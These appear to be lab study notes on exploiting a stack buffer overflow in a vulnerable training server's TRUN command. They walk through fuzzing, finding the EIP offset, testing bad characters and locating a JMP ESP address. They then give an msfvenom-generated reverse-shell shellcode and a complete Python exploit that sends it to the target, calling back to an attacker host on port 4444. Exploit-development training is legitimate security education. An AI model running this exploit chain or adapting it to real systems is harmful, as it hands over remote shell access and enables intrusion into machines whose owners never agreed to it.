![[BufferOverflow.png]]

# Spiking
spk script
```
s_readline();
s_string("STATS ");
s_string_variable("0");
```
spiking with script
`generic_send_tcp 192.168.1.101 9999 stats.spk 0 0`

# Defining length for fuzzing pattern

```python
import sys, socket
from time import sleep

buffer = 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.101', 9999))

        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()

```

# Generating Fuzzing pattern
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500`

output:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
```

# Defining EIP offset
```python
import sys, socket

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.101', 9999))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print "Error while connecting to server"
    sys.exit()
```

execute this script and then we should look for the EIP content in debugger
content was `386F4337`
with this we can get EIP offset with next tool
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337`

# Defining Bad Characters

```python
import sys, socket

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset = 'A' * 2003 + 'B' * 4 + badchars

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.101', 9999))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print "Error while connecting to server"
    sys.exit()

```
badchars var simply contains all symbols from 01 to FF
after executing this script in debugger select ESP register and follow it in dump
in dump we should look for characters that is not in place, like if at the place of 05 something else

# Finding modules
google for mona modules and add that command to debugger
then with debugger running and programm attached 
`!mona modules`
to see all modules and look for modules with out protection

use 
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
to check opcode for `jmp esp`
the opcode is `ffe4`

now search for this opcode in modules with mona's help
`!mona find -s "\xff\xe4 -, essfunc.dll"`
we will get bunch of fitting addresses, one of them is `625011af`

# Generating and using shellcode

use this to generate shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.102 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`

**-f** - format
**-a** - target architecture
**-b** - bad chars that we found earlier

the result will be
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xda\xd3\xba\x36\x20\x32\x27\xd9\x74\x24\xf4\x5d\x31\xc9"
"\xb1\x52\x31\x55\x17\x03\x55\x17\x83\xdb\xdc\xd0\xd2\xdf"
"\xf5\x97\x1d\x1f\x06\xf8\x94\xfa\x37\x38\xc2\x8f\x68\x88"
"\x80\xdd\x84\x63\xc4\xf5\x1f\x01\xc1\xfa\xa8\xac\x37\x35"
"\x28\x9c\x04\x54\xaa\xdf\x58\xb6\x93\x2f\xad\xb7\xd4\x52"
"\x5c\xe5\x8d\x19\xf3\x19\xb9\x54\xc8\x92\xf1\x79\x48\x47"
"\x41\x7b\x79\xd6\xd9\x22\x59\xd9\x0e\x5f\xd0\xc1\x53\x5a"
"\xaa\x7a\xa7\x10\x2d\xaa\xf9\xd9\x82\x93\x35\x28\xda\xd4"
"\xf2\xd3\xa9\x2c\x01\x69\xaa\xeb\x7b\xb5\x3f\xef\xdc\x3e"
"\xe7\xcb\xdd\x93\x7e\x98\xd2\x58\xf4\xc6\xf6\x5f\xd9\x7d"
"\x02\xeb\xdc\x51\x82\xaf\xfa\x75\xce\x74\x62\x2c\xaa\xdb"
"\x9b\x2e\x15\x83\x39\x25\xb8\xd0\x33\x64\xd5\x15\x7e\x96"
"\x25\x32\x09\xe5\x17\x9d\xa1\x61\x14\x56\x6c\x76\x5b\x4d"
"\xc8\xe8\xa2\x6e\x29\x21\x61\x3a\x79\x59\x40\x43\x12\x99"
"\x6d\x96\xb5\xc9\xc1\x49\x76\xb9\xa1\x39\x1e\xd3\x2d\x65"
"\x3e\xdc\xe7\x0e\xd5\x27\x60\xf1\x82\x26\x16\x99\xd0\x28"
"\xc7\x05\x5c\xce\x8d\xa5\x08\x59\x3a\x5f\x11\x11\xdb\xa0"
"\x8f\x5c\xdb\x2b\x3c\xa1\x92\xdb\x49\xb1\x43\x2c\x04\xeb"
"\xc2\x33\xb2\x83\x89\xa6\x59\x53\xc7\xda\xf5\x04\x80\x2d"
"\x0c\xc0\x3c\x17\xa6\xf6\xbc\xc1\x81\xb2\x1a\x32\x0f\x3b"
"\xee\x0e\x2b\x2b\x36\x8e\x77\x1f\xe6\xd9\x21\xc9\x40\xb0"
"\x83\xa3\x1a\x6f\x4a\x23\xda\x43\x4d\x35\xe3\x89\x3b\xd9"
"\x52\x64\x7a\xe6\x5b\xe0\x8a\x9f\x81\x90\x75\x4a\x02\xb0"
"\x97\x5e\x7f\x59\x0e\x0b\xc2\x04\xb1\xe6\x01\x31\x32\x02"
"\xfa\xc6\x2a\x67\xff\x83\xec\x94\x8d\x9c\x98\x9a\x22\x9c"
"\x88";
```

final step is executing shellcode with

```python
import sys, socket

#625011af address of jmp esp equivalent in programm 

overflow = (
"\xda\xd3\xba\x36\x20\x32\x27\xd9\x74\x24\xf4\x5d\x31\xc9"
"\xb1\x52\x31\x55\x17\x03\x55\x17\x83\xdb\xdc\xd0\xd2\xdf"
"\xf5\x97\x1d\x1f\x06\xf8\x94\xfa\x37\x38\xc2\x8f\x68\x88"
"\x80\xdd\x84\x63\xc4\xf5\x1f\x01\xc1\xfa\xa8\xac\x37\x35"
"\x28\x9c\x04\x54\xaa\xdf\x58\xb6\x93\x2f\xad\xb7\xd4\x52"
"\x5c\xe5\x8d\x19\xf3\x19\xb9\x54\xc8\x92\xf1\x79\x48\x47"
"\x41\x7b\x79\xd6\xd9\x22\x59\xd9\x0e\x5f\xd0\xc1\x53\x5a"
"\xaa\x7a\xa7\x10\x2d\xaa\xf9\xd9\x82\x93\x35\x28\xda\xd4"
"\xf2\xd3\xa9\x2c\x01\x69\xaa\xeb\x7b\xb5\x3f\xef\xdc\x3e"
"\xe7\xcb\xdd\x93\x7e\x98\xd2\x58\xf4\xc6\xf6\x5f\xd9\x7d"
"\x02\xeb\xdc\x51\x82\xaf\xfa\x75\xce\x74\x62\x2c\xaa\xdb"
"\x9b\x2e\x15\x83\x39\x25\xb8\xd0\x33\x64\xd5\x15\x7e\x96"
"\x25\x32\x09\xe5\x17\x9d\xa1\x61\x14\x56\x6c\x76\x5b\x4d"
"\xc8\xe8\xa2\x6e\x29\x21\x61\x3a\x79\x59\x40\x43\x12\x99"
"\x6d\x96\xb5\xc9\xc1\x49\x76\xb9\xa1\x39\x1e\xd3\x2d\x65"
"\x3e\xdc\xe7\x0e\xd5\x27\x60\xf1\x82\x26\x16\x99\xd0\x28"
"\xc7\x05\x5c\xce\x8d\xa5\x08\x59\x3a\x5f\x11\x11\xdb\xa0"
"\x8f\x5c\xdb\x2b\x3c\xa1\x92\xdb\x49\xb1\x43\x2c\x04\xeb"
"\xc2\x33\xb2\x83\x89\xa6\x59\x53\xc7\xda\xf5\x04\x80\x2d"
"\x0c\xc0\x3c\x17\xa6\xf6\xbc\xc1\x81\xb2\x1a\x32\x0f\x3b"
"\xee\x0e\x2b\x2b\x36\x8e\x77\x1f\xe6\xd9\x21\xc9\x40\xb0"
"\x83\xa3\x1a\x6f\x4a\x23\xda\x43\x4d\x35\xe3\x89\x3b\xd9"
"\x52\x64\x7a\xe6\x5b\xe0\x8a\x9f\x81\x90\x75\x4a\x02\xb0"
"\x97\x5e\x7f\x59\x0e\x0b\xc2\x04\xb1\xe6\x01\x31\x32\x02"
"\xfa\xc6\x2a\x67\xff\x83\xec\x94\x8d\x9c\x98\x9a\x22\x9c"
"\x88")

offset = 'A' * 2003 + '\xaf\x11\x50\x62' + "\x90" * 32 + overflow # \x90 stays for nop

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.101', 9999))
    s.send(('TRUN /.:/' + offset))
    s.close()
except:
    print "Error while connecting to server"
    sys.exit()
```